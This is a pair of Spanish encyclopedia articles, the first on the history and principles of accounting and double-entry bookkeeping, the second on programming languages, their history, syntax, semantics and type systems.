En el Renacimiento, la aparición del concepto de capital productivo y el desarrollo del crédito, sentaron los fundamentos necesarios para la elaboración de un sistema contable. Surge en primer lugar las cuentas que reflejaban los créditos y los débitos de las personas. Por extensión, se pensó en llevar una cuenta para el conjunto de los bienes poseídos y otra que presentara las ganancias o las pérdidas. Este conjunto de cuentas condujo a la elaboración del sistema contable de partida doble.

Los historiadores estiman que la contabilidad por partida doble apareció hacia 1340 en Génova (Italia). La invención de la imprenta generalizó este método, en particular desde la publicación de los tratados de Luca Pacioli, cuya primera obra, editada en 1494 bajo el título "Summa de Arithmetica, Geometría, Proportioni et Proportionalitá", enuncia los principios fundamentales en el capítulo relativo a las cuentas y libros.

El primer autor del que tenemos noticia que estableció claramente el uso del método de la partida doble fue Benedetto Cotrugli (en eslavo, Kotruljević), nacido en la actual Dubrovnik en Croacia, entonces una ciudad comercial adriática del área de influencia veneciana, llamada Ragusa.

Cotrugli residió en Nápoles gran parte de su vida, y fue comerciante y consejero del rey Fernando I de Aragón. Su obra "Della Mercature e del Mercante Perffeto" fue escrita en 1458. De forma casi incidental, dedica uno de sus capítulos al modo de llevar las cuentas mencionando distintos libros: "El Memorial, el Diario y el Mayor", al que denomina "Quaderno". Enumera también algunas reglas generales para contabilizar las operaciones comerciales, pero en conjunto las referencias de Benedetto a la contabilidad del comerciante son incompletas.

El libro de Cotrugli tardó casi ciento quince años en ser llevado a la imprenta, lo que, unido al carácter incompleto de su exposición, impide que pueda adjudicarse a su autor en la historia de la contabilidad un papel comparable al de Luca Pacioli. El trabajo de este último fue impreso y conocido muchos años antes, aunque escrito con posterioridad al de Benedetto.

Luca Pacioli, o Luca de Borgo Sancti Sepulchri, nació en el pueblo Umbría, provincia italiana en el año de 1455. Estudió en Venecia, donde fue preceptor de los hijos de un rico mercader de la ciudad, del que probablemente aprendió los procedimientos contables que luego expuso en su magna obra "Summa de Arithmetica, Geometría, Proportioni et Proportionalità", impresa en Venecia en 1494, por lo que los ejemplares de esta edición son libros incunables. Pacioli, que parece no ingresó en la orden de San Francisco hasta edad madura, fue un gran matemático, un auténtico humanista del Renacimiento, amigo de Leonardo da Vinci, del cual se dice que incluso ilustró algunos de los textos y de otros grandes pensadores de la época, que impartió enseñanza en varias universidades italianas.

Pacioli dedicó treinta y seis capítulos del "Summa de Arithmetica, Geometría, Proportioni et Proportionalità" a la descripción de los métodos contables empleados por los principales comerciantes venecianos. El autor destinó, además, parte de sus trabajos a la descripción de otros usos mercantiles, tales como contratos de sociedad, el cobro de intereses y el empleo de las letras de cambio.

Según Pacioli las anotaciones en el libro diario constan de dos partes claramente diferenciadas: una comenzando con la palabra Por (el Debe del asiento contable) y la otra con la palabra A (el Haber del asiento contable), antecedente del modelo de asiento contable tradicional. Dado que en aquella época no era costumbre la utilización del balance de situación, sólo describe los usos en la elaboración del balance de comprobación de sumas y saldos, que era utilizado al agotarse las páginas del libro mayor.

Estas anotaciones eran efectuadas bajo las normas de la partida doble, la cual, Pacioli aseguraba que él sólo enseñaba, lo cual ya se ejecutaba mucho antes por los mercaderes. La partida doble asegura que por cada aumento del activo (en el "debe") hay un aumento en las cuentas del pasivo y capital (dentro del "haber"). Asimismo, habiendo una disminución en las cuentas del activo (dentro del debe), hay igualmente una disminución en las cuentas del pasivo y capital (dentro del haber), así efectuándose las normas de la partida doble.

La traducción en inglés fue publicada en Londres por John Gouge o Gough en 1543. Se describe como "Un Tratado Provechoso" ("A profitable treatyce"), también denominado "El Instrumento o Libro para aprender el buen orden de llevanza del famoso conocimiento llamado en Latín Dare y Habere, es decir, Debe y Haber.

Algunos de los aspectos en los que colaboró Pacioli para la contabilidad son:





En 1588, se publicó un pequeño libro de instrucción por John Mellis de Southwark, en el que dice: «Soy el renovador y revividor de una antigua copia publicada aquí en Londres, el 14 de agosto de 1543». John Mellis se refiere al hecho de que los principios de contabilidad que explica (que es un sistema de partida doble) siguen «la forma de Venecia».

Desde el nacimiento de la partida doble en el Renacimiento, la contabilidad, si bien ha sido enriquecida con desarrollos técnicos, no ha sufrido cambios fundamentales. El estudio sistemático de la historia de la contabilidad moderna comienza a mediados del siglo XIX, los italianos fueron los pioneros en la elaboración de teorías más o menos científicas basadas en la relación entre contabilidad y administración empresarial. Las principales escuelas, iniciadas a principios del siglo XIX fueron las siguientes:

La escuela lombarda de Francesco Villa, que aborda la elaboración de teorías más o menos científicas, distinguiendo entre la técnica y la ciencia y elaborando un conjunto de principios económico-administrativos.

Francesco Villa. Nacido en Milán en 1801, ha sido considerado el padre de la moderna contabilidad italiana. Efectivamente, su magna obra "Elementi di amministrazione e contabilitá", aparecida en Pavía en 1850, puede considerarse el punto de partida de una nueva concepción de la contabilidad, sobre bases completamente distintas a las anteriores. La mecánica de la teneduría de libros es, para este autor, un simple instrumento utilizado por la contabilidad, ciencia de contenido y ambiciones mucho más amplios, que se integra como parte fundamental en el complejo organizativo de la empresa. Los "Elementi" de Villa se dividen en tres partes, cuya enumeración ya nos permite calibrar la “modernidad” de su autor: Conceptos económico-administrativos, De la Teneduría de libros y de sus aplicaciones más usuales, y finalmente Organización administrativa y revisión de cuentas. En sus "Elementi", Villa desarrolló un estudio sistemático y profundo de la empresa desde el punto de vista de la organización, la división del trabajo, los objetivos perseguidos y los principios administrativos que deben orientar la manera de llevar los libros. Además, el autor milanés publicó muchas otras obras, no solamente sobre temas contables hasta que finalmente murió en el año 1884.

En el año 1867 apareció en Prato una obra que había de hacer célebre a su autor, Francesco Marchi (1822-1917). En ella se atacaba duramente a la doctrina de la escuela cincocuentista, seguidora del método de Degranges, que durante más de medio siglo había dominado la escena de los estudios de teoría contable en Europa.

Desde el punto de vista de Marchi son cuatro las clases de personas interesadas en la vida de la empresa:

Las cuentas se dividen en dos grupos:
Después de Marchi apareció un gran número de autores que configuraron la escuela toscana. Entre todos ellos descolló Giuseppe Cerboni.

En su obra "Primi saggi di logismografia", proponía un nuevo sistema contable. La logismografía está emparentada con la doctrina de la personificación de las cuentas, pero visto desde un punto de vista jurídico, en la que el hecho contable crea una relación contable entre personas, naturales o jurídicas que se anota, utilizando una cuenta para cada una de las personas implicadas. Según Cerboni, la contabilidad debe contemplar, antes que la actividad económica de la empresa, los actos de sus órganos administrativos, con el objeto de ejercer un control sobre ellos.

El impulsor de la escuela veneciana, Fabio Besta (escuela controlista), define el patrimonio como un conjunto de bienes o fondo de valores, analizándolo desde el punto de vista económico y las cuentas son los medios de representación de los elementos que componen el patrimonio.

Para Besta, la contabilidad aspira a ser la ciencia del control financiero. La contabilidad debe encaminarse a la medición del patrimonio económico que a su vez no tiene porqué coincidir con el concepto jurídico del patrimonio.

Zappa opina que la finalidad de la unidad económica es obtener rédito y que toda la problemática contable debe quedar subordinada a la determinación del mismo.

Sostiene que el objeto de la investigación contable es el patrimonio considerado en su aspecto estático y dinámico, cualitativo y cuantitativo y que su fin es el gobierno oportuno, prudente y conveniente de tal patrimonio.

Creador de la escuela patrimonialista fue quien configuró finalmente los alcances del paradigma de beneficio económico, al señalar que “la contabilidad tiene por objeto el estudio de los fenómenos patrimoniales, sus manifestaciones y su comportamiento y trata de disciplinarlos con relación a determinado patrimonio de la empresa. De acuerdo con este paradigma las generalizaciones simbólicas se basan en los conceptos de renta y valor para la medición del patrimonio, la partida doble evolucionada a una dualidad de la empresa en marcha se constituye en el patrón metodológico de medición, las técnicas y procedimientos se seleccionan en función a su correlación y uniformidad con los conceptos fundamentales, y el sistema contable refleja adecuadamente la realidad económica (verdad económica) y suministra uni-direccionalmente la información suficiente a los usuarios potenciales. Como valores compartidos se encuentran la búsqueda de la verdad económica: el cálculo del beneficio y de la situación patrimonial, sin importar quién la recibe y por qué. Ejemplares: aparece un nuevo conformante financiero, el patrimonio, por tanto la mejor medición y representación posible de la situación patrimonial y del beneficio fueron fines de la regulación contable.

Son cada uno de los bienes, derechos y obligaciones que forman parte del patrimonio de las empresas. El marco conceptual del Comité Internacional de Normas Contables (International Accounting Standards Board, IASB) define cinco elementos básicos que componen la contabilidad:

Todos éstos deben seguir un itinerario lógico para su adecuada contabilización, cuyos pasos quedan reflejados en los estados financieros:


El patrimonio de una empresa es el conjunto de bienes, derechos y obligaciones relativos a una empresa que constituyen los medios económicos y financieros a través de los cuales puede cumplir sus objetivos.

El patrimonio está formado por multitud de elementos de carácter muy dispar, por lo que se denomina, como ya se mencionó, elemento patrimonial a cada uno de los bienes, derechos y obligaciones que forman parte de la empresa.

A efectos de su valoración, el patrimonio está formado por una parte positiva (activo), constituida por los bienes (elementos materiales), así como de los derechos (elementos intangibles), derivados de relaciones jurídicas de la empresa y una parte negativa (pasivo), formada por las obligaciones. La suma algebraica del valor positivo de los bienes y derechos, junto con el valor negativo de las obligaciones daría como resultado el valor del patrimonio neto.

La ecuación fundamental del patrimonio expone que se cumple cuando la suma del valor de los activos (-bienes y derechos-) es igual a la suma del valor de los pasivos y del patrimonio neto (capital).

El activo es el conjunto de bienes (elementos materiales) y derechos (elementos intangibles) controlados económicamente por la empresa, derivados de relaciones jurídicas de propiedad, posesión, uso, crédito, etc. El cual se divide en "circulante", "fijo" y "diferido".






Se puede calcular esta partida como la diferencia entre el activo y el pasivo. Se cumple así la ecuación contable: "Activo total = Pasivo total + Patrimonio neto (Capital)"; o lo que es lo mismo, "Activo total − Pasivo total = Patrimonio neto (Capital)", siendo entonces "Activo total − Pasivo corriente − Pasivo no corriente = Patrimonio neto contable". También puede ser calculada por la agrupación o suma directa de los elementos que la componen básicamente capital más reservas más resultados del ejercicio.

La contabilidad, como ciencia, utiliza un método denominado contable, que se compone de cuatro pasos:

Las cuentas son los instrumentos de representación y medida de cada elemento patrimonial. Cada una consta de una denominación y un código numérico, que la identifican de manera única. Estos elementos identificativos son la representación de la realidad de los elementos del patrimonio, escritos en un papel o en un registro electrónico. Por tanto, hay tantas cuentas como elementos patrimoniales tenga la empresa. La regulación contable suele establecer la libertad para que cada entidad disponga las cuentas que va a utilizar en su proceso contable y el grado de detalle de su información, aunque hay legislaciones (como por ejemplo Francia, México, España o Perú) que establecen planes o manuales de cuentas orientativos para que sean utilizados por las empresas y aunque la legislación contable en materia de número y nombre de cuentas no suele ser obligatoria, si es utilizado habitualmente de forma homogénea por las empresas de un mismo país. El plan contable de una empresa es la codificación del conjunto de cuentas que utiliza una empresa, incluye todas las cuentas y las agrupaciones de las mismas.

De acuerdo con esto, por ejemplo es habitual, que existan cuentas para los inmuebles, el mobiliario y el conjunto de inmovilizado de una empresa, las mercancías, las materias primas, las deudas de clientes y los créditos con proveedores, las cuentas y préstamos bancarios, así como cuentas para los distintos gastos e ingresos existentes como pueden ser gastos de personal, financieros, de servicios recibidos. Cada empresa también dispone del grado de desarrollo que quiere utilizar en su sistema contable y las cuentas suelen agruparse en distintas partidas o grupos que reflejan los mismos conceptos de bienes o gastos.

Gráficamente se dibujan como una letra "T", donde a la parte izquierda se llama "débito" o "debe" y a la parte derecha "crédito"o "haber", sin que estos términos tengan ningún otro significado más que el indicar una mera situación física dentro de la cuenta (el debe es la parte izquierda de la cuenta y el haber es la parte derecha de la cuenta, y no representan otra cosa como lo pueden indicar las diferentes acepciones de estas palabras). Hay dos tipos de cuenta: de patrimonio y de gestión o de resultados. Las cuentas de patrimonio aparecerán en el balance y pueden formar parte del activo o del pasivo (y dentro de este, del pasivo exigible o del capital, también llamado fondos propios o patrimonio neto). Las cuentas de gestión o de resultados son las que reflejan ingresos o gastos y aparecerán en la cuenta de "Pérdidas y Ganancias".

Independientemente de si las cuentas son de patrimonio o de resultados, también se dice que por su naturaleza son deudoras o acreedoras. Las cuentas son "deudoras" cuando, siendo de patrimonio, se refieren a un activo o, siendo de gestión, se refieren a un gasto; y son "acreedoras" cuando, siendo de patrimonio, se refieren a un pasivo o a una cuenta de capital, o cuando, siendo de gestión, se refieren a un ingreso.

"Cargar" o "debitar" una cuenta es hacer una anotación en el debe, mientras que "Abonar" o "acreditar" una cuenta es hacer una anotación en el haber. En las cuentas de activo, cuando este aumenta, se cargan, y cuando disminuye, se abonan. En las cuentas de pasivo y de capital, cuando este aumenta, se abonan, y cuando disminuye, se cargan.

Por lo que se refiere al efecto que tienen las transacciones comerciales sin alterar la ecuación patrimonial, aunque cada transacción afecta el balance, cambia los valores en el patrimonio, pero sin alterar la igualdad de la ecuación. En cada una de esas transacciones, actúan por lo menos dos cuentas. Existen siete tipos de transacciones que siguen la teoría del cargo y del abono.

El sistema de partida doble consiste en que, en cada hecho contable, se ha de producir al menos un "cargo" en una cuenta y un "abono" en otra, y la suma de los cargos debe ser igual a la suma de los abonos efectuados; en otras palabras, todos los recursos que existen en una empresa son el resultado de la aplicación de recursos que tuvieron una fuente definida.

La "partida doble" como técnica contable obedece a los siguientes criterios:

Se llama saldo de una cuenta a la diferencia entre los débitos (anotaciones realizadas en el debe de una cuenta) y créditos (anotaciones realizadas en el haber de una cuenta). Cuando los débitos sean mayores que los créditos será saldo deudor, sin embargo cuando los créditos sean mayores que los débitos será saldo acreedor. Cuando los débitos sean iguales a los créditos, se entenderá que la cuenta está saldada, balanceada o sin saldo.

Cuando se han realizado todas las anotaciones contables en el libro diario se calcula el saldo de cada una de las cuentas y se elabora un estado transitorio denominado "balance de comprobación o de saldos", que es un listado de todas las cuentas abiertas con su saldo. La suma de los saldos acreedores debe ser igual a la suma de los saldos deudores, debido al sistema mencionado de partida doble.

Partiendo del balance de sumas y saldos se realiza el denominado asiento de regularización en el que se regularizan todas las cuentas de ingresos y gastos y aparece la cuenta de pérdidas y ganancias. El balance de situación se obtiene así después de regularizar el balance de comprobación.

Los libros de contabilidad son los documentos que soportan y reflejan los hechos con trascendencia en la realidad económica de la empresa a lo largo de un período de tiempo. La legislación mercantil establece cuáles son los libros contables obligatorios para las empresas. Los libros de contabilidad principales son:

El libro diario (en inglés "journal") es uno de los principales libros contables, donde se recogen, por orden cronológico, todas las operaciones de la actividad económico empresarial, según se van produciendo en el tiempo. La anotación de un hecho económico en el libro diario se denomina "asiento". Cada asiento debe reflejar la información referida a un hecho económico completo y debe estar compuesto al menos por dos apuntes o anotaciones en dos cuentas diferentes. Los asientos por definición deben estar cuadrados, lo que significa que la suma de las cantidades anotadas en un asiento en el debe han de ser iguales a las cantidades anotadas en el haber de ese mismo asiento. El que un asiento esté cuadrado manifiesta que se han tenido en cuenta todas las consecuencias del hecho económico.

Este libro (en inglés "ledger") recoge la información ya incluida en el diario, pero reordenada por cuentas, en él se recogen para cada cuenta, de acuerdo con el principio de partida doble, todos los cargos y abonos realizados en las mismas y es más fácil de llevar.

Los libros de balances (en inglés "balance sheet") reflejan la situación del patrimonio de la empresa en una fecha determinada. Los balances se crean cuando hemos pasado las cantidades de las cuentas de los asientos a su libro mayor.

Desde el punto de vista legal, la ley suele marcar el plazo durante el cual los empresarios deben conservar sus libros obligatorios (diario, inventarios y cuentas anuales) como los no obligatorios (mayor, registros de impuesto sobre el valor añadido, auxiliares, etc), así como la documentación y justificantes que sirven de soporte a las anotaciones registradas en los libros. En España, este plazo de conservación está fijado en seis años. Los libros obligatorios, deben conservarse en soporte material de papel y en una adecuada encuadernación.

El funcionamiento de la contabilidad es regulado por las normas contables, que debido a diferencias de carácter fiscal, cultural, económicas y políticas, presentan diferencias entre los países, lo que dificulta la comparabilidad de la información publicada por las empresas en distintos países. Estas normas pueden ser aprobadas de forma legal o pueden estar reguladas por entidades privadas de carácter profesional. Su contenido incluye los principios, reglas y prácticas necesarias para preparar los estados financieros.

Los denominados estados financieros o cuentas anuales son los informes que muestran de forma sintetizada, los datos fundamentales del proceso contable de un ejercicio, su formulación se realiza una vez al año, después de la terminación del ejercicio económico. Los documentos que los componen deben ser claros y expresar la imagen fiel del patrimonio, de la situación financiera y de los resultados de la empresa a la que se refieran.

Aunque cada país regula el contenido obligatorio de los estados financieros, suele estar formados por los siguientes elementos:

Los estados financieros suministran informes que pueden utilizar las instituciones para reportar la situación económica y financiera y los cambios que experimenta la misma a una fecha o periodo determinado. Esta información resulta útil para los administradores, gestores, reguladores y otros tipos de interesados como los accionistas, acreedores o propietarios.

Según el marco conceptual para la preparación y presentación de los estados financieros, existen cuatro criterios de medición:
Los activos se registran por el monto de efectivo o equivalentes de efectivo pagados, o por el valor justo del activo entregado a
cambio en el momento de la adquisición. Los pasivos se registran por el valor del producto recibido a cambio de incurrir en la obligación o, en algunas circunstancias (por ejemplo, impuesto a la renta por pagar) por los montos de efectivo o equivalentes de efectivo que se espera pagar para extinguir la correspondiente obligación.
Los activos se llevan contablemente por el monto de efectivo, o equivalentes de efectivo, que debería pagarse si se adquiriese en la actualidad el mismo activo u otro de similares características. Los pasivos se registran al monto de efectivo o equivalente de efectivo que se requiere para liquidar la obligación al momento presente.
Los activos se registran contablemente por el monto de efectivo o equivalentes de efectivo que podrían ser obtenidos, en el momento presente, en la venta no forzada de los mismos. Los pasivos se registran a sus valores de liquidación, esto es, los montos sin descontar de efectivo o equivalentes de efectivo, que se espera pagar por las obligaciones en el curso normal de las operaciones.
Los activos se registran contablemente al valor actual, descontando las futuras entradas netas de efectivo que se espera genere la
partida en el curso normal de las operaciones. Los pasivos se registran por el valor actual, descontando las salidas netas de efectivo que se necesitarán para pagar las obligaciones, en el curso normal de las operaciones.

Aunque la contabilidad se puede realizar de forma manual, actualmente está extendido el uso de aplicaciones informáticas que facilitan la labor contable. Se denomina software contable a las aplicaciones informáticas que están destinados a sistematizar y simplificar estas tareas en la empresa. Las aplicaciones pueden limitarse a la elaboración de la contabilidad o estar integrados con el resto del sistema informático de la empresa, como puede ser la facturación, nóminas, inventario etc.



</doc>
<doc id="6527" url="https://es.wikipedia.org/wiki?curid=6527" title="Lenguaje de programación">
Lenguaje de programación

Un lenguaje de programación es un lenguaje formal diseñado para realizar procesos que pueden ser llevados a cabo por máquinas como las computadoras. 

Pueden usarse para crear programas que controlen el comportamiento físico y lógico de una máquina, para expresar algoritmos con precisión, o como modo de comunicación humana. 

Está formado por un conjunto de símbolos y reglas sintácticas y semánticas que definen su estructura y el significado de sus elementos y expresiones. Al proceso por el cual se escribe, se prueba, se depura, se compila (de ser necesario) y se mantiene el código fuente de un programa informático se le llama programación.

También la palabra programación se define como el proceso de creación de un programa de computadora, mediante la aplicación de procedimientos lógicos, a través de los siguientes pasos:


Existe un error común que trata por sinónimos los términos 'lenguaje de programación' y 'lenguaje informático'. Los lenguajes informáticos engloban a los lenguajes de programación y a otros más, como por ejemplo HTML (lenguaje para el marcado de páginas web que no es propiamente un lenguaje de programación, sino un conjunto de instrucciones que permiten estructurar el contenido de los documentos).

Permite especificar de "manera precisa" sobre qué datos debe operar una computadora, cómo deben ser almacenados o transmitidos y qué acciones debe tomar bajo una variada gama de circunstancias. Todo esto, a través de un lenguaje que intenta estar "relativamente" próximo al lenguaje humano o natural. Una característica relevante de los lenguajes de programación es precisamente que más de un programador pueda usar un conjunto común de instrucciones que sean comprendidas entre ellos para realizar la construcción de un programa de forma colaborativa.

Para que la computadora entienda nuestras instrucciones debe usarse un lenguaje específico conocido como código máquina, el cual la máquina comprende fácilmente, pero que lo hace excesivamente complicado para las personas. De hecho sólo consiste en cadenas extensas de números 0 y 1.

Para facilitar el trabajo, los primeros operadores de computadoras decidieron hacer un traductor para reemplazar los 0 y 1 por palabras o abstracción de palabras y letras provenientes del inglés; éste se conoce como lenguaje ensamblador. Por ejemplo, para sumar se usa la letra A de la palabra inglesa "add" (sumar). El lenguaje ensamblador sigue la misma estructura del lenguaje máquina, pero las letras y palabras son más fáciles de recordar y entender que los números.

La necesidad de recordar secuencias de programación para las acciones usuales llevó a denominarlas con nombres fáciles de memorizar y asociar: codice_1 (sumar), codice_2 (restar), codice_3 (multiplicar), codice_4 (ejecutar subrutina), etc. A esta secuencia de posiciones se le denominó "instrucciones", y a este conjunto de instrucciones se le llamó lenguaje ensamblador. Posteriormente aparecieron diferentes lenguajes de programación, los cuales reciben su denominación porque tienen una estructura sintáctica semejante a la de los lenguajes escritos por los humanos, denominados también lenguajes de alto nivel.

El primer programador de computadora que se haya conocido fue una mujer: Ada Lovelace, hija de Anabella Milbanke Byron y Lord Byron. Anabella inició en las matemáticas a Ada quien, después de conocer a Charles Babbage, tradujo y amplió una descripción de su máquina analítica. Incluso aunque Babbage nunca completó la construcción de cualquiera de sus máquinas, el trabajo que Ada realizó con éstas le hizo ganarse el título de primera programadora de computadoras del mundo. El nombre del lenguaje de programación Ada fue escogido como homenaje a esta programadora.

A finales de 1953, John Backus sometió una propuesta a sus superiores en IBM para desarrollar una alternativa más práctica al lenguaje ensamblador para programar la computadora central IBM 704. El histórico equipo Fortran de Backus consistió en los programadores Richard Goldberg, Sheldon F. Best, Harlan Herrick, Peter Sheridan, Roy Nutt, Robert Nelson, Irving Ziller, Lois Haibt y David Sayre.

El primer manual para el lenguaje Fortran apareció en octubre de 1956, con el primer compilador Fortran entregado en abril de 1957. Esto era un compilador optimizado, porque los clientes eran reacios a usar un lenguaje de alto nivel a menos que su compilador pudiera generar código cuyo desempeño fuera comparable al de un código hecho a mano en lenguaje ensamblador.

En 1960, se creó COBOL, uno de los lenguajes usados aún en la actualidad, en informática de gestión.

A medida que la complejidad de las tareas que realizaban las computadoras aumentaba, se hizo necesario disponer de un método más eficiente para programarlas. Entonces, se crearon los lenguajes de alto nivel, como lo fue BASIC en las versiones introducidas en los microordenadores de la década de 1980. Mientras que una tarea tan sencilla como sumar dos números puede necesitar varias instrucciones en lenguaje ensamblador, en un lenguaje de alto nivel bastará una sola sentencia.

Las variables son títulos asignados a espacios en memoria para almacenar datos específicos. Son contenedores de datos y por ello se diferencian según el tipo de dato que son capaces de almacenar. En la mayoría de lenguajes de programación se requiere especificar un tipo de variable concreto para guardar un dato específico. Por ejemplo, en Java, si deseamos guardar una cadena de texto debemos especificar que la variable es del tipo "String". Por otra parte, en lenguajes como PHP este tipo de especificación de variables no es necesario. Además, existen variables compuestas llamadas vectores. Un vector no es más que un conjunto de bytes consecutivas en memoria y del mismo tipo guardadas dentro de una variable contenedor. A continuación, un listado con los tipos de variables y vectores más comunes:

En el caso de variables booleanas, el cero es considerado para muchos lenguajes como el literal falso ("False"), mientras que el uno se considera verdadero ("True").

Las sentencias condicionales son estructuras de código que indican que, para que cierta parte del programa se ejecute, deben cumplirse ciertas premisas; por ejemplo: que dos valores sean iguales, que un valor exista, que un valor sea mayor que otro... Estos condicionantes por lo general solo se ejecutan una vez a lo largo del programa. Los condicionantes más conocidos y empleados en programación son:


Los bucles son parientes cercanos de los condicionantes, pero ejecutan constantemente un código mientras se cumpla una determinada condición. Los más frecuentes son:


Hay que decir que a pesar de que existan distintos tipos de bucles, todos son capaces de realizar exactamente las mismas funciones. El empleo de uno u otro depende, por lo general, del gusto del programador.

Las funciones se crearon para evitar tener que repetir constantemente fragmentos de código. Una función podría considerarse como una variable que encierra código dentro de si. Por lo tanto cuando accedemos a dicha variable (la función) en realidad lo que estamos haciendo es ordenar al programa que ejecute un determinado código predefinido anteriormente.

Todos los lenguajes de programación tienen algunos elementos de formación primitivos para la descripción de los datos y de los procesos o transformaciones aplicadas a estos datos (tal como la suma de dos números o la selección de un elemento que forma parte de una colección). Estos elementos primitivos son definidos por reglas sintácticas y semánticas que describen su estructura y significado respectivamente.

A la forma visible de un lenguaje de programación se le conoce como sintaxis. La mayoría de los lenguajes de programación son puramente textuales, es decir, utilizan secuencias de texto que incluyen palabras, números y puntuación, de manera similar a los lenguajes naturales escritos. Por otra parte, hay algunos lenguajes de programación que son más gráficos en su naturaleza, utilizando relaciones visuales entre símbolos para especificar un programa.

La sintaxis de un lenguaje de programación describe las combinaciones posibles de los símbolos que forman un programa sintácticamente correcto. El significado que se le da a una combinación de símbolos es manejado por su semántica (ya sea formal o como parte del código duro de la referencia de implementación). Dado que la mayoría de los lenguajes son textuales, este artículo trata de la sintaxis textual.

La sintaxis de los lenguajes de programación es definida generalmente utilizando una combinación de expresiones regulares (para la estructura léxica) y la Notación de Backus-Naur (para la estructura gramática). Este es un ejemplo de una gramática simple, tomada de Lisp:

Con esta gramática se especifica lo siguiente:


Algunos ejemplos de secuencias bien formadas de acuerdo a esta gramática:

'codice_5', 'codice_6', 'codice_7'

No todos los programas sintácticamente correctos son semánticamente correctos. Muchos programas sintácticamente correctos tienen inconsistencias con las reglas del lenguaje; y pueden (dependiendo de la especificación del lenguaje y la solidez de la implementación) resultar en un error de traducción o ejecución. En algunos casos, tales programas pueden exhibir un comportamiento indefinido. Además, incluso cuando un programa está bien definido dentro de un lenguaje, todavía puede tener un significado que no es el que la persona que lo escribió estaba tratando de construir.

Usando el lenguaje natural, por ejemplo, puede no ser posible asignarle significado a una oración gramaticalmente válida o la oración puede ser falsa:


El siguiente fragmento en el lenguaje C es sintácticamente correcto, pero ejecuta una operación que no está definida semánticamente (dado que p es un apuntador nulo, las operaciones p->real y p->im no tienen ningún significado):

Si la declaración de tipo de la primera línea fuera omitida, el programa dispararía un error de compilación, pues la variable "p" no estaría definida. Pero el programa sería sintácticamente correcto todavía, dado que las declaraciones de tipo proveen información semántica solamente.

La gramática necesaria para especificar un lenguaje de programación puede ser clasificada por su posición en la Jerarquía de Chomsky. La sintaxis de la mayoría de los lenguajes de programación puede ser especificada utilizando una gramática Tipo-2, es decir, son gramáticas libres de contexto. Algunos lenguajes, incluyendo a Perl y a Lisp, contienen construcciones que permiten la ejecución durante la fase de análisis. Los lenguajes que permiten construcciones que permiten al programador alterar el comportamiento de un analizador hacen del análisis de la sintaxis un problema sin decisión única, y generalmente oscurecen la separación entre análisis y ejecución. En contraste con el sistema de macros de Lisp y los bloques BEGIN de Perl, que pueden tener cálculos generales, las macros de C son meros reemplazos de cadenas, y no requieren ejecución de código.

La semántica estática define las restricciones sobre la estructura de los textos válidos que resulta imposible o muy difícil expresar mediante formalismos sintácticos estándar. Para los lenguajes compilados, la semántica estática básicamente incluye las reglas semánticas que se pueden verificar en el momento de compilar. Por ejemplo el chequeo de que cada identificador sea declarado antes de ser usado (en lenguajes que requieren tales declaraciones) o que las etiquetas en cada brazo de una estructura "case" sean distintas. Muchas restricciones importantes de este tipo, como la validación de que los identificadores sean usados en los contextos apropiados (por ejemplo no sumar un entero al nombre de una función), o que las llamadas a subrutinas tengan el número y tipo de parámetros adecuado, puede ser implementadas definiéndolas como reglas en una lógica conocida como sistema de tipos. Otras formas de análisis estáticos, como los análisis de flujo de datos, también pueden ser parte de la semántica estática. Otros lenguajes de programación como Java y C# tienen un análisis definido de asignaciones, una forma de análisis de flujo de datos, como parte de su semántica estática.

Un sistema de tipos define la manera en la cual un lenguaje de programación clasifica los valores y expresiones en "tipos", cómo pueden ser manipulados dichos tipos y cómo interactúan. El objetivo de un sistema de tipos es verificar y normalmente poner en vigor un cierto nivel de exactitud en programas escritos en el lenguaje en cuestión, detectando ciertas operaciones inválidas. Cualquier sistema de tipos decidible tiene sus ventajas y desventajas: mientras por un lado rechaza muchos programas incorrectos, también prohíbe algunos programas correctos aunque poco comunes. Para poder minimizar esta desventaja, algunos lenguajes incluyen "lagunas de tipos", conversiones explícitas no verificadas que pueden ser usadas por el programador para permitir explícitamente una operación normalmente no permitida entre diferentes tipos. En la mayoría de los lenguajes con tipos, el sistema de tipos es usado solamente para verificar los tipos de los programas, pero varios lenguajes, generalmente funcionales, llevan a cabo lo que se conoce como inferencia de tipos, que le quita al programador la tarea de especificar los tipos. Al diseño y estudio formal de los sistemas de tipos se le conoce como "teoría de tipos".

Se dice que un lenguaje es tipado si la especificación de cada operación debe definir los tipos de datos para los cuales es aplicable, con la implicación de que no es aplicable a otros tipos. Por ejemplo, "codice_8" es una cadena de caracteres. En la mayoría de los lenguajes de programación, dividir un número por una cadena de caracteres no tiene ningún significado. Por tanto, la mayoría de los lenguajes de programación modernos rechazarían cualquier intento de ejecutar dicha operación por parte de algún programa. En algunos lenguajes, estas operaciones sin significado son detectadas cuando el programa es compilado (validación de tipos "estática") y son rechazadas por el compilador, mientras en otros son detectadas cuando el programa es ejecutado (validación de tipos "dinámica") y se genera una excepción en tiempo de ejecución.

Un caso especial de lenguajes de tipo son los lenguajes de "tipo sencillo". Estos son con frecuencia lenguajes de marcado o de scripts, como REXX o SGML, y solamente cuentan con un tipo de datos; comúnmente cadenas de caracteres que luego son usadas tanto para datos numéricos como simbólicos.

En contraste, un lenguaje "sin tipos", como la mayoría de los lenguajes ensambladores, permiten que cualquier operación se aplique a cualquier dato, que por lo general se consideran secuencias de bits de varias longitudes. Lenguajes de alto nivel "sin datos" incluyen BCPL y algunas variedades de Forth.

En la práctica, aunque pocos lenguajes son considerados con tipo desde el punto de vista de la teoría de tipos (es decir, que verifican o rechazan "todas" las operaciones), la mayoría de los lenguajes modernos ofrecen algún grado de manejo de tipos. Si bien muchos lenguajes de producción proveen medios para evitar o rodear el sistema de tipado.

En lenguajes con "tipos estáticos" se determina el tipo de todas las expresiones antes de la ejecución del programa (típicamente al compilar). Por ejemplo, 1 y (2+2) son expresiones enteras; no pueden ser pasadas a una función que espera una cadena, ni pueden guardarse en una variable que está definida como fecha.

Los lenguajes con tipos estáticos pueden manejar tipos "explícitos" o tipos "inferidos". En el primer caso, el programador debe escribir los tipos en determinadas posiciones textuales. En el segundo caso, el compilador "infiere" los tipos de las expresiones y las declaraciones de acuerdo al contexto. La mayoría de los lenguajes populares con tipos estáticos, tales como C++, C# y Java, manejan tipos explícitos. Inferencia total de los tipos suele asociarse con lenguajes menos populares, tales como Haskell y ML. Sin embargo, muchos lenguajes de tipos explícitos permiten inferencias parciales de tipo; tanto Java y C#, por ejemplo, infieren tipos en un número limitado de casos.

